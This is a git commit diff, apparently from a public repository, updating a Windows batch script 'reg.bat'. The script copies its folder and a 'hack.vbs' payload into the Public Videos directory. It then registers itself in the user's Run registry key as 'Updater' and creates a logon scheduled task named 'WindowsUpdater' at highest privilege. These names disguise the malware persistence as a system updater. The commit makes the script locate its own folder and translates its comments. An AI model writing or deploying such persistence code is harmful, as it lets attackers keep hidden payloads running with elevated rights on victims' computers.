27f1c4ca784a2c0412afef77ad4ada44c4b3acb4
Amir Mahdi Zare <83335541+amir13872@users.noreply.github.com>
2025-03-07 16:42:47 +0330

    Update reg.bat

--- reg.bat
+++ reg.bat
@@ -1,14 +1,14 @@
 @echo off
 set payloadPath=C:\Users\Public\Videos\hack.vbs
 set taskName=WindowsUpdater
-set sourceFolder=C:\path\to\your\folder   :: Change this to your folder's path
+set sourceFolder=%~dp0    :: Get the folder where the batch file is located
 set destinationFolder=C:\Users\Public\Videos
 
 :: Copy the folder and its contents to the destination folder
 xcopy "%sourceFolder%" "%destinationFolder%" /E /I /H /Y
 
-:: اضافه کردن به استارت‌آپ (Registry)
+:: Add to startup (Registry)
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "%~f0" /f
 
-:: ایجاد Scheduled Task برای اجرای بات‌فایل پس از هر ری‌استارت
+:: Create Scheduled Task to run batch file after every restart
 schtasks /create /sc onlogon /tn %taskName% /tr "%~f0" /f /rl highest
